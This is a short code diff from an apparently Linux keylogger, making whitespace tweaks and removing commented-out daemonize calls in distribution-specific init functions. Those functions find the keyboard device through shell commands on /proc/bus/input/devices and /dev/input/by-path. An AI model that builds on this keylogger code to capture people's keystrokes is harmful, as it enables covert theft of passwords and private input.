@@ -39,7 +39,6 @@ void ubuntu16_keylogger_init(void)
 
 void ubuntu18_keylogger_init(void)
 {
-
     /** For Debian **/
     //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 |  grep -Eo event[0-9]";
     //const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";
@@ -73,11 +72,9 @@ void mint_keylogger_init(void)
 
 void debian_keylogger_init(void)
 {
-    //daemonize_keylogger();
-
     /* For Debian */
     //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 |  grep -Eo event[0-9]";
-    const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";
+    const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";
 
     /* For Debian */
     debian_get_kb_device_filename(command);
@@ -87,8 +84,6 @@ void debian_keylogger_init(void)
 
 void kali_keylogger_init(void)
 {
-    //daemonize_keylogger();
-
     /* Kali and Mint 19 */
     const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";
 
@@ -100,7 +95,6 @@ void kali_keylogger_init(void)
 
 void fedora_keylogger_init(void)
 {
-    //daemonize_keylogger();
 
     /* Fedora 28 */
     const char *command =  "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";
